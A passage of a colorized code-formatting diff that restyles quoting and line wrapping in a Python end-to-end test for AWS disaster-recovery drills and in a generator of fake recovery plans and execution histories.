\"source_server_id\": s.get(\"sourceServerID\"),\u001b[0m\n\u001b[32m+                            \"launch_status\": s.get(\"launchStatus\"),\u001b[0m\n\u001b[32m+                            \"instance_id\": s.get(\"recoveryInstanceID\"),\u001b[0m\n\u001b[32m+                            \"hostname\": s.get(\"hostname\", \"unknown\"),\u001b[0m\n\u001b[32m+                        }\u001b[0m\n\u001b[32m+                        for s in servers\u001b[0m\n\u001b[32m+                    ],\u001b[0m\n\u001b[32m+                    \"all_launched\": all_launched,\u001b[0m\n\u001b[32m+                    \"any_failed\": any_failed,\u001b[0m\n\u001b[32m+                    \"success\": all_launched and not any_failed,\u001b[0m\n                 }\n\u001b[31m-                \u001b[0m\n\u001b[32m+\u001b[0m\n                 drs_results.append(job_result)\n\u001b[31m-                self.results['drs_jobs'].append(job_result)\u001b[0m\n\u001b[31m-                \u001b[0m\n\u001b[32m+                self.results[\"drs_jobs\"].append(job_result)\u001b[0m\n\u001b[32m+\u001b[0m\n                 # Log results\n\u001b[31m-                if job_result['success']:\u001b[0m\n\u001b[31m-                    logger.info(f\"    \u2705 All servers LAUNCHED ({len(servers)} servers)\")\u001b[0m\n\u001b[32m+                if job_result[\"success\"]:\u001b[0m\n\u001b[32m+                    logger.info(\u001b[0m\n\u001b[32m+                        f\"    \u2705 All servers LAUNCHED ({len(servers)} servers)\"\u001b[0m\n\u001b[32m+                    )\u001b[0m\n                 else:\n\u001b[31m-                    logger.error(f\"    \u274c Job failed - {sum(1 for s in servers if s.get('launchStatus') != 'LAUNCHED')} server(s) failed\")\u001b[0m\n\u001b[31m-                    self.results['errors'].append(f\"DRS job {job_id} failed to launch servers\")\u001b[0m\n\u001b[31m-                \u001b[0m\n\u001b[32m+                    logger.error(\u001b[0m\n\u001b[32m+                        f\"    \u274c Job failed - {sum(1 for s in servers if s.get('launchStatus') != 'LAUNCHED')} server(s) failed\"\u001b[0m\n\u001b[32m+                    )\u001b[0m\n\u001b[32m+                    self.results[\"errors\"].append(\u001b[0m\n\u001b[32m+                        f\"DRS job {job_id} failed to launch servers\"\u001b[0m\n\u001b[32m+                    )\u001b[0m\n\u001b[32m+\u001b[0m\n             except Exception as e:\n                 logger.error(f\"  Error monitoring DRS job {job_id}: {str(e)}\")\n\u001b[31m-                self.results['errors'].append(f\"DRS monitoring error for job {job_id}: {str(e)}\")\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+                self.results[\"errors\"].append(\u001b[0m\n\u001b[32m+                    f\"DRS monitoring error for job {job_id}: {str(e)}\"\u001b[0m\n\u001b[32m+                )\u001b[0m\n\u001b[32m+\u001b[0m\n         return drs_results\n\u001b[31m-    \u001b[0m\n\u001b[31m-    def _validate_ec2_instances(self, drs_results: List[Dict[str, Any]]) -> List[Dict[str, Any]]:\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    def _validate_ec2_instances(\u001b[0m\n\u001b[32m+        self, drs_results: List[Dict[str, Any]]\u001b[0m\n\u001b[32m+    ) -> List[Dict[str, Any]]:\u001b[0m\n         \"\"\"\n         Validate EC2 instances were launched successfully.\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         Args:\n             drs_results: DRS job results with instance IDs\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n         Returns:\n             List of EC2 validation results\n         \"\"\"\n         ec2_results = []\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Collect all instance IDs\n         instance_ids = []\n         for job_result in drs_results:\n\u001b[31m-            for server in job_result.get('servers', []):\u001b[0m\n\u001b[31m-                instance_id = server.get('instance_id')\u001b[0m\n\u001b[32m+            for server in job_result.get(\"servers\", []):\u001b[0m\n\u001b[32m+                instance_id = server.get(\"instance_id\")\u001b[0m\n                 if instance_id:\n                     instance_ids.append(instance_id)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         if not instance_ids:\n             logger.warning(\"  No EC2 instances to validate\")\n\u001b[31m-            self.results['warnings'].append(\"No EC2 instances found\")\u001b[0m\n\u001b[32m+            self.results[\"warnings\"].append(\"No EC2 instances found\")\u001b[0m\n             return ec2_results\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         logger.info(f\"  Validating {len(instance_ids)} EC2 instance(s)...\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         try:\n             # Query EC2 for instance details\n             response = self.ec2.describe_instances(InstanceIds=instance_ids)\n\u001b[31m-            \u001b[0m\n\u001b[31m-            for reservation in response.get('Reservations', []):\u001b[0m\n\u001b[31m-                for instance in reservation.get('Instances', []):\u001b[0m\n\u001b[31m-                    instance_id = instance.get('InstanceId')\u001b[0m\n\u001b[31m-                    state = instance.get('State', {}).get('Name', 'unknown')\u001b[0m\n\u001b[31m-                    \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+            for reservation in response.get(\"Reservations\", []):\u001b[0m\n\u001b[32m+                for instance in reservation.get(\"Instances\", []):\u001b[0m\n\u001b[32m+                    instance_id = instance.get(\"InstanceId\")\u001b[0m\n\u001b[32m+                    state = instance.get(\"State\", {}).get(\"Name\", \"unknown\")\u001b[0m\n\u001b[32m+\u001b[0m\n                     instance_result = {\n\u001b[31m-                        'instance_id': instance_id,\u001b[0m\n\u001b[31m-                        'state': state,\u001b[0m\n\u001b[31m-                        'instance_type': instance.get('InstanceType'),\u001b[0m\n\u001b[31m-                        'private_ip': instance.get('PrivateIpAddress'),\u001b[0m\n\u001b[31m-                        'public_ip': instance.get('PublicIpAddress'),\u001b[0m\n\u001b[31m-                        'subnet_id': instance.get('SubnetId'),\u001b[0m\n\u001b[31m-                        'vpc_id': instance.get('VpcId'),\u001b[0m\n\u001b[31m-                        'launch_time': instance.get('LaunchTime').isoformat() if instance.get('LaunchTime') else None,\u001b[0m\n\u001b[31m-                        'running': state == 'running'\u001b[0m\n\u001b[32m+                        \"instance_id\": instance_id,\u001b[0m\n\u001b[32m+                        \"state\": state,\u001b[0m\n\u001b[32m+                        \"instance_type\": instance.get(\"InstanceType\"),\u001b[0m\n\u001b[32m+                        \"private_ip\": instance.get(\"PrivateIpAddress\"),\u001b[0m\n\u001b[32m+                        \"public_ip\": instance.get(\"PublicIpAddress\"),\u001b[0m\n\u001b[32m+                        \"subnet_id\": instance.get(\"SubnetId\"),\u001b[0m\n\u001b[32m+                        \"vpc_id\": instance.get(\"VpcId\"),\u001b[0m\n\u001b[32m+                        \"launch_time\": instance.get(\"LaunchTime\").isoformat()\u001b[0m\n\u001b[32m+                        if instance.get(\"LaunchTime\")\u001b[0m\n\u001b[32m+                        else None,\u001b[0m\n\u001b[32m+                        \"running\": state == \"running\",\u001b[0m\n                     }\n\u001b[31m-                    \u001b[0m\n\u001b[32m+\u001b[0m\n                     ec2_results.append(instance_result)\n\u001b[31m-                    self.results['ec2_instances'].append(instance_result)\u001b[0m\n\u001b[31m-                    \u001b[0m\n\u001b[32m+                    self.results[\"ec2_instances\"].append(instance_result)\u001b[0m\n\u001b[32m+\u001b[0m\n                     # Log results\n\u001b[31m-                    if instance_result['running']:\u001b[0m\n\u001b[31m-                        logger.info(f\"    \u2705 Instance {instance_id}: {state} ({instance.get('InstanceType')})\")\u001b[0m\n\u001b[32m+                    if instance_result[\"running\"]:\u001b[0m\n\u001b[32m+                        logger.info(\u001b[0m\n\u001b[32m+                            f\"    \u2705 Instance {instance_id}: {state} ({instance.get('InstanceType')})\"\u001b[0m\n\u001b[32m+                        )\u001b[0m\n                     else:\n\u001b[31m-                        logger.warning(f\"    \u26a0\ufe0f  Instance {instance_id}: {state} (expected: running)\")\u001b[0m\n\u001b[31m-                        self.results['warnings'].append(f\"Instance {instance_id} not running: {state}\")\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+                        logger.warning(\u001b[0m\n\u001b[32m+                            f\"    \u26a0\ufe0f  Instance {instance_id}: {state} (expected: running)\"\u001b[0m\n\u001b[32m+                        )\u001b[0m\n\u001b[32m+                        self.results[\"warnings\"].append(\u001b[0m\n\u001b[32m+                            f\"Instance {instance_id} not running: {state}\"\u001b[0m\n\u001b[32m+                        )\u001b[0m\n\u001b[32m+\u001b[0m\n         except Exception as e:\n             logger.error(f\"  Error validating EC2 instances: {str(e)}\")\n\u001b[31m-            self.results['errors'].append(f\"EC2 validation error: {str(e)}\")\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+            self.results[\"errors\"].append(f\"EC2 validation error: {str(e)}\")\u001b[0m\n\u001b[32m+\u001b[0m\n         return ec2_results\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def _generate_report(self) -> None:\n         \"\"\"Generate detailed test report.\"\"\"\n         logger.info(\"\\n\" + \"=\" * 80)\n         logger.info(\"TEST RESULTS SUMMARY\")\n         logger.info(\"=\" * 80)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         logger.info(f\"\\nExecution ID: {self.results['execution_id']}\")\n         logger.info(f\"Execution Status: {self.results['execution_status']}\")\n         logger.info(f\"Test Duration: {self._calculate_duration()}\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         logger.info(f\"\\nWaves: {len(self.results['waves'])}\")\n\u001b[31m-        for wave in self.results['waves']:\u001b[0m\n\u001b[31m-            logger.info(f\"  - Wave {wave.get('wave_id')}: {wave.get('status')}\")\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        for wave in self.results[\"waves\"]:\u001b[0m\n\u001b[32m+            logger.info(\u001b[0m\n\u001b[32m+                f\"  - Wave {wave.get('wave_id')}: {wave.get('status')}\"\u001b[0m\n\u001b[32m+            )\u001b[0m\n\u001b[32m+\u001b[0m\n         logger.info(f\"\\nDRS Jobs: {len(self.results['drs_jobs'])}\")\n\u001b[31m-        for job in self.results['drs_jobs']:\u001b[0m\n\u001b[31m-            status = \"\u2705 SUCCESS\" if job.get('success') else \"\u274c FAILED\"\u001b[0m\n\u001b[32m+        for job in self.results[\"drs_jobs\"]:\u001b[0m\n\u001b[32m+            status = \"\u2705 SUCCESS\" if job.get(\"success\") else \"\u274c FAILED\"\u001b[0m\n             logger.info(f\"  - Job {job.get('job_id')}: {status}\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         logger.info(f\"\\nEC2 Instances: {len(self.results['ec2_instances'])}\")\n\u001b[31m-        running_count = sum(1 for i in self.results['ec2_instances'] if i.get('running'))\u001b[0m\n\u001b[31m-        logger.info(f\"  - Running: {running_count}/{len(self.results['ec2_instances'])}\")\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        if self.results['errors']:\u001b[0m\n\u001b[32m+        running_count = sum(\u001b[0m\n\u001b[32m+            1 for i in self.results[\"ec2_instances\"] if i.get(\"running\")\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+        logger.info(\u001b[0m\n\u001b[32m+            f\"  - Running: {running_count}/{len(self.results['ec2_instances'])}\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        if self.results[\"errors\"]:\u001b[0m\n             logger.info(f\"\\nErrors: {len(self.results['errors'])}\")\n\u001b[31m-            for error in self.results['errors']:\u001b[0m\n\u001b[32m+            for error in self.results[\"errors\"]:\u001b[0m\n                 logger.error(f\"  - {error}\")\n\u001b[31m-        \u001b[0m\n\u001b[31m-        if self.results['warnings']:\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        if self.results[\"warnings\"]:\u001b[0m\n             logger.info(f\"\\nWarnings: {len(self.results['warnings'])}\")\n\u001b[31m-            for warning in self.results['warnings']:\u001b[0m\n\u001b[32m+            for warning in self.results[\"warnings\"]:\u001b[0m\n                 logger.warning(f\"  - {warning}\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def _calculate_duration(self) -> str:\n         \"\"\"Calculate test duration.\"\"\"\n\u001b[31m-        if not self.results['test_start_time'] or not self.results['test_end_time']:\u001b[0m\n\u001b[32m+        if (\u001b[0m\n\u001b[32m+            not self.results[\"test_start_time\"]\u001b[0m\n\u001b[32m+            or not self.results[\"test_end_time\"]\u001b[0m\n\u001b[32m+        ):\u001b[0m\n             return \"unknown\"\n\u001b[31m-        \u001b[0m\n\u001b[31m-        start = datetime.fromisoformat(self.results['test_start_time'])\u001b[0m\n\u001b[31m-        end = datetime.fromisoformat(self.results['test_end_time'])\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        start = datetime.fromisoformat(self.results[\"test_start_time\"])\u001b[0m\n\u001b[32m+        end = datetime.fromisoformat(self.results[\"test_end_time\"])\u001b[0m\n         duration = (end - start).total_seconds()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         minutes = int(duration // 60)\n         seconds = int(duration % 60)\n         return f\"{minutes}m {seconds}s\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def _parse_dynamodb_item(self, item: Dict[str, Any]) -> Dict[str, Any]:\n         \"\"\"Parse DynamoDB item format to Python dict.\"\"\"\n         result = {}\n         for key, value in item.items():\n\u001b[31m-            if 'S' in value:\u001b[0m\n\u001b[31m-                result[key] = value['S']\u001b[0m\n\u001b[31m-            elif 'N' in value:\u001b[0m\n\u001b[31m-                result[key] = int(value['N']) if '.' not in value['N'] else float(value['N'])\u001b[0m\n\u001b[31m-            elif 'L' in value:\u001b[0m\n\u001b[31m-                result[key] = [self._parse_dynamodb_value(v) for v in value['L']]\u001b[0m\n\u001b[31m-            elif 'M' in value:\u001b[0m\n\u001b[31m-                result[key] = self._parse_dynamodb_item(value['M'])\u001b[0m\n\u001b[31m-            elif 'BOOL' in value:\u001b[0m\n\u001b[31m-                result[key] = value['BOOL']\u001b[0m\n\u001b[32m+            if \"S\" in value:\u001b[0m\n\u001b[32m+                result[key] = value[\"S\"]\u001b[0m\n\u001b[32m+            elif \"N\" in value:\u001b[0m\n\u001b[32m+                result[key] = (\u001b[0m\n\u001b[32m+                    int(value[\"N\"])\u001b[0m\n\u001b[32m+                    if \".\" not in value[\"N\"]\u001b[0m\n\u001b[32m+                    else float(value[\"N\"])\u001b[0m\n\u001b[32m+                )\u001b[0m\n\u001b[32m+            elif \"L\" in value:\u001b[0m\n\u001b[32m+                result[key] = [\u001b[0m\n\u001b[32m+                    self._parse_dynamodb_value(v) for v in value[\"L\"]\u001b[0m\n\u001b[32m+                ]\u001b[0m\n\u001b[32m+            elif \"M\" in value:\u001b[0m\n\u001b[32m+                result[key] = self._parse_dynamodb_item(value[\"M\"])\u001b[0m\n\u001b[32m+            elif \"BOOL\" in value:\u001b[0m\n\u001b[32m+                result[key] = value[\"BOOL\"]\u001b[0m\n         return result\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def _parse_dynamodb_value(self, value: Dict[str, Any]) -> Any:\n         \"\"\"Parse a single DynamoDB value.\"\"\"\n\u001b[31m-        if 'S' in value:\u001b[0m\n\u001b[31m-            return value['S']\u001b[0m\n\u001b[31m-        elif 'N' in value:\u001b[0m\n\u001b[31m-            return int(value['N']) if '.' not in value['N'] else float(value['N'])\u001b[0m\n\u001b[31m-        elif 'L' in value:\u001b[0m\n\u001b[31m-            return [self._parse_dynamodb_value(v) for v in value['L']]\u001b[0m\n\u001b[31m-        elif 'M' in value:\u001b[0m\n\u001b[31m-            return self._parse_dynamodb_item(value['M'])\u001b[0m\n\u001b[31m-        elif 'BOOL' in value:\u001b[0m\n\u001b[31m-            return value['BOOL']\u001b[0m\n\u001b[32m+        if \"S\" in value:\u001b[0m\n\u001b[32m+            return value[\"S\"]\u001b[0m\n\u001b[32m+        elif \"N\" in value:\u001b[0m\n\u001b[32m+            return (\u001b[0m\n\u001b[32m+                int(value[\"N\"]) if \".\" not in value[\"N\"] else float(value[\"N\"])\u001b[0m\n\u001b[32m+            )\u001b[0m\n\u001b[32m+        elif \"L\" in value:\u001b[0m\n\u001b[32m+            return [self._parse_dynamodb_value(v) for v in value[\"L\"]]\u001b[0m\n\u001b[32m+        elif \"M\" in value:\u001b[0m\n\u001b[32m+            return self._parse_dynamodb_item(value[\"M\"])\u001b[0m\n\u001b[32m+        elif \"BOOL\" in value:\u001b[0m\n\u001b[32m+            return value[\"BOOL\"]\u001b[0m\n         return value\n\u001b[31m-    \u001b[0m\n\u001b[31m-    def _extract_wave_data(self, execution: Dict[str, Any]) -> List[Dict[str, Any]]:\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    def _extract_wave_data(\u001b[0m\n\u001b[32m+        self, execution: Dict[str, Any]\u001b[0m\n\u001b[32m+    ) -> List[Dict[str, Any]]:\u001b[0m\n         \"\"\"Extract simplified wave data.\"\"\"\n         waves = []\n\u001b[31m-        for wave in execution.get('Waves', []):\u001b[0m\n\u001b[31m-            waves.append({\u001b[0m\n\u001b[31m-                'wave_id': wave.get('WaveId'),\u001b[0m\n\u001b[31m-                'status': wave.get('Status'),\u001b[0m\n\u001b[31m-                'job_id': wave.get('JobId'),\u001b[0m\n\u001b[31m-                'server_count': len(wave.get('Servers', []))\u001b[0m\n\u001b[31m-            })\u001b[0m\n\u001b[32m+        for wave in execution.get(\"Waves\", []):\u001b[0m\n\u001b[32m+            waves.append(\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"wave_id\": wave.get(\"WaveId\"),\u001b[0m\n\u001b[32m+                    \"status\": wave.get(\"Status\"),\u001b[0m\n\u001b[32m+                    \"job_id\": wave.get(\"JobId\"),\u001b[0m\n\u001b[32m+                    \"server_count\": len(wave.get(\"Servers\", [])),\u001b[0m\n\u001b[32m+                }\u001b[0m\n\u001b[32m+            )\u001b[0m\n         return waves\n \n \n def main():\n     \"\"\"Main entry point for automated testing.\"\"\"\n     import argparse\n\u001b[31m-    \u001b[0m\n\u001b[31m-    parser = argparse.ArgumentParser(description='Run end-to-end automated test')\u001b[0m\n\u001b[31m-    parser.add_argument('--api-endpoint', required=True, help='API Gateway endpoint URL')\u001b[0m\n\u001b[31m-    parser.add_argument('--plan-id', required=True, help='Recovery plan ID')\u001b[0m\n\u001b[31m-    parser.add_argument('--region', default='us-east-1', help='AWS region')\u001b[0m\n\u001b[31m-    parser.add_argument('--recovery', action='store_true', help='Run recovery (default: drill)')\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    parser = argparse.ArgumentParser(\u001b[0m\n\u001b[32m+        description=\"Run end-to-end automated test\"\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+    parser.add_argument(\u001b[0m\n\u001b[32m+        \"--api-endpoint\", required=True, help=\"API Gateway endpoint URL\"\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+    parser.add_argument(\"--plan-id\", required=True, help=\"Recovery plan ID\")\u001b[0m\n\u001b[32m+    parser.add_argument(\"--region\", default=\"us-east-1\", help=\"AWS region\")\u001b[0m\n\u001b[32m+    parser.add_argument(\u001b[0m\n\u001b[32m+        \"--recovery\", action=\"store_true\", help=\"Run recovery (default: drill)\"\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+\u001b[0m\n     args = parser.parse_args()\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Run test\n     test = AutomatedE2ETest(\n         api_endpoint=args.api_endpoint,\n         plan_id=args.plan_id,\n\u001b[31m-        region=args.region\u001b[0m\n\u001b[32m+        region=args.region,\u001b[0m\n     )\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     results = test.run_test(is_drill=not args.recovery)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Save results to file\n     output_file = f\"test_results_{results['execution_id']}.json\"\n\u001b[31m-    with open(output_file, 'w') as f:\u001b[0m\n\u001b[32m+    with open(output_file, \"w\") as f:\u001b[0m\n         json.dump(results, f, indent=2, default=str)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     logger.info(f\"\\nResults saved to: {output_file}\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Exit with appropriate code\n\u001b[31m-    exit(0 if results['success'] else 1)\u001b[0m\n\u001b[31m-\u001b[0m\n\u001b[31m-\u001b[0m\n\u001b[31m-if __name__ == '__main__':\u001b[0m\n\u001b[32m+    exit(0 if results[\"success\"] else 1)\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+if __name__ == \"__main__\":\u001b[0m\n     main()\n\u001b[1m--- tests/python/utils/test_data_generator.py\t2025-11-19 23:12:54.078491+00:00\u001b[0m\n\u001b[1m+++ tests/python/utils/test_data_generator.py\t2026-01-02 15:49:03.697737+00:00\u001b[0m\n\u001b[36m@@ -10,25 +10,25 @@\u001b[0m\n \n \n def generate_server_id() -> str:\n     \"\"\"\n     Generate a random DRS source server ID in format: s-{17 hex chars}\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     Returns:\n         Server ID string (e.g., \"s-3d75cdc0d9a28a725\")\n     \"\"\"\n\u001b[31m-    hex_chars = ''.join(random.choices('0123456789abcdef', k=17))\u001b[0m\n\u001b[32m+    hex_chars = \"\".join(random.choices(\"0123456789abcdef\", k=17))\u001b[0m\n     return f\"s-{hex_chars}\"\n \n \n def generate_server_ids(count: int) -> List[str]:\n     \"\"\"\n     Generate multiple unique server IDs.\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     Args:\n         count: Number of server IDs to generate\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n     Returns:\n         List of unique server IDs\n     \"\"\"\n     return [generate_server_id() for _ in range(count)]\n \n\u001b[36m@@ -37,68 +37,73 @@\u001b[0m\n     wave_count: int = 3,\n     servers_per_wave: int = 2,\n     execution_types: Optional[List[str]] = None,\n     with_dependencies: bool = True,\n     wait_times: Optional[List[int]] = None,\n\u001b[31m-    plan_id: Optional[str] = None\u001b[0m\n\u001b[32m+    plan_id: Optional[str] = None,\u001b[0m\n ) -> Dict[str, Any]:\n     \"\"\"\n     Generate a random recovery plan with configurable parameters.\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     Args:\n         wave_count: Number of waves to generate\n         servers_per_wave: Number of servers per wave\n         execution_types: List of execution types (SEQUENTIAL, PARALLEL) for each wave\n                         If None, randomly assigns types\n         with_dependencies: Whether to create sequential dependencies between waves\n         wait_times: List of wait times for each wave. If None, generates random times\n         plan_id: Optional plan ID. If None, generates random ID\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n     Returns:\n         Dictionary representing a recovery plan\n     \"\"\"\n     if plan_id is None:\n         plan_id = f\"plan-{uuid.uuid4().hex[:12]}\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     if execution_types is None:\n\u001b[31m-        execution_types = [random.choice([\"SEQUENTIAL\", \"PARALLEL\"]) for _ in range(wave_count)]\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        execution_types = [\u001b[0m\n\u001b[32m+            random.choice([\"SEQUENTIAL\", \"PARALLEL\"])\u001b[0m\n\u001b[32m+            for _ in range(wave_count)\u001b[0m\n\u001b[32m+        ]\u001b[0m\n\u001b[32m+\u001b[0m\n     if wait_times is None:\n         wait_times = [random.randint(0, 300) for _ in range(wave_count)]\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     waves = []\n     for i in range(wave_count):\n         wave_number = i + 1\n\u001b[31m-        execution_type = execution_types[i] if i < len(execution_types) else \"SEQUENTIAL\"\u001b[0m\n\u001b[32m+        execution_type = (\u001b[0m\n\u001b[32m+            execution_types[i] if i < len(execution_types) else \"SEQUENTIAL\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n         wait_time = wait_times[i] if i < len(wait_times) else 0\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Generate server IDs for this wave\n         server_ids = generate_server_ids(servers_per_wave)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Generate execution order based on type\n         if execution_type == \"PARALLEL\":\n             execution_order = [1] * servers_per_wave\n         else:  # SEQUENTIAL\n             execution_order = list(range(1, servers_per_wave + 1))\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Generate dependencies\n         dependencies = []\n         if with_dependencies and i > 0:\n             dependencies = [f\"Wave-{i}\"]\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         wave = {\n             \"WaveNumber\": wave_number,\n             \"WaveName\": f\"Wave {wave_number}\",\n             \"WaveDescription\": f\"Generated wave {wave_number}\",\n             \"ServerIds\": server_ids,\n             \"ExecutionType\": execution_type,\n             \"ExecutionOrder\": execution_order,\n             \"Dependencies\": dependencies,\n\u001b[31m-            \"WaitTimeSeconds\": wait_time\u001b[0m\n\u001b[32m+            \"WaitTimeSeconds\": wait_time,\u001b[0m\n         }\n         waves.append(wave)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     return {\n         \"PlanId\": plan_id,\n         \"PlanName\": f\"Generated Plan {plan_id}\",\n         \"Description\": f\"Randomly generated plan with {wave_count} waves\",\n         \"AccountId\": \"123456789012\",\n\u001b[36m@@ -106,88 +111,104 @@\u001b[0m\n         \"Owner\": \"test@example.com\",\n         \"RPO\": random.randint(60, 3600),\n         \"RTO\": random.randint(300, 7200),\n         \"Waves\": waves,\n         \"CreatedDate\": int(time.time()),\n\u001b[31m-        \"LastModifiedDate\": int(time.time())\u001b[0m\n\u001b[32m+        \"LastModifiedDate\": int(time.time()),\u001b[0m\n     }\n \n \n def generate_execution_history(\n     plan_id: str,\n     execution_id: Optional[str] = None,\n     status: str = \"COMPLETED\",\n     wave_count: int = 3,\n     servers_per_wave: int = 2,\n\u001b[31m-    with_errors: bool = False\u001b[0m\n\u001b[32m+    with_errors: bool = False,\u001b[0m\n ) -> Dict[str, Any]:\n     \"\"\"\n     Generate execution history record for database seeding.\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     Args:\n         plan_id: Recovery plan ID\n         execution_id: Optional execution ID. If None, generates random UUID\n         status: Execution status (RUNNING, COMPLETED, FAILED, CANCELLED)\n         wave_count: Number of waves in the execution\n         servers_per_wave: Number of servers per wave\n         with_errors: Whether to include error details\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n     Returns:\n         Dictionary representing an execution history record\n     \"\"\"\n     if execution_id is None:\n         execution_id = str(uuid.uuid4())\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     start_time = int(time.time()) - random.randint(300, 3600)\n\u001b[31m-    end_time = start_time + random.randint(60, 1800) if status != \"RUNNING\" else None\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+    end_time = (\u001b[0m\n\u001b[32m+        start_time + random.randint(60, 1800) if status != \"RUNNING\" else None\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+\u001b[0m\n     # Generate wave statuses\n     wave_statuses = []\n     total_servers = wave_count * servers_per_wave\n     failed_count = 0\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     for i in range(wave_count):\n         wave_number = i + 1\n         server_results = []\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         for j in range(servers_per_wave):\n             server_id = generate_server_id()\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Determine server status\n             # If with_errors is True, ensure at least one failure\n\u001b[31m-            should_fail = with_errors and (random.random() < 0.2 or (failed_count == 0 and i == wave_count - 1 and j == servers_per_wave - 1))\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+            should_fail = with_errors and (\u001b[0m\n\u001b[32m+                random.random() < 0.2\u001b[0m\n\u001b[32m+                or (\u001b[0m\n\u001b[32m+                    failed_count == 0\u001b[0m\n\u001b[32m+                    and i == wave_count - 1\u001b[0m\n\u001b[32m+                    and j == servers_per_wave - 1\u001b[0m\n\u001b[32m+                )\u001b[0m\n\u001b[32m+            )\u001b[0m\n\u001b[32m+\u001b[0m\n             if should_fail:\n                 server_status = \"FAILED\"\n                 error_message = f\"Recovery failed for {server_id}\"\n                 job_id = None\n                 failed_count += 1\n             else:\n                 server_status = \"COMPLETED\"\n                 error_message = None\n                 job_id = f\"job-{uuid.uuid4().hex[:16]}\"\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             server_result = {\n                 \"ServerId\": server_id,\n                 \"Status\": server_status,\n                 \"JobId\": job_id,\n\u001b[31m-                \"RecoveryInstanceId\": f\"i-{uuid.uuid4().hex[:17]}\" if server_status == \"COMPLETED\" else None,\u001b[0m\n\u001b[32m+                \"RecoveryInstanceId\": f\"i-{uuid.uuid4().hex[:17]}\"\u001b[0m\n\u001b[32m+                if server_status == \"COMPLETED\"\u001b[0m\n\u001b[32m+                else None,\u001b[0m\n                 \"StartTime\": start_time + (i * 60) + (j * 10),\n\u001b[31m-                \"EndTime\": start_time + (i * 60) + (j * 10) + random.randint(30, 120),\u001b[0m\n\u001b[31m-                \"ErrorMessage\": error_message\u001b[0m\n\u001b[32m+                \"EndTime\": start_time\u001b[0m\n\u001b[32m+                + (i * 60)\u001b[0m\n\u001b[32m+                + (j * 10)\u001b[0m\n\u001b[32m+                + random.randint(30, 120),\u001b[0m\n\u001b[32m+                \"ErrorMessage\": error_message,\u001b[0m\n             }\n             server_results.append(server_result)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         wave_status = {\n             \"WaveNumber\": wave_number,\n\u001b[31m-            \"Status\": \"FAILED\" if with_errors and random.random() < 0.1 else \"COMPLETED\",\u001b[0m\n\u001b[32m+            \"Status\": 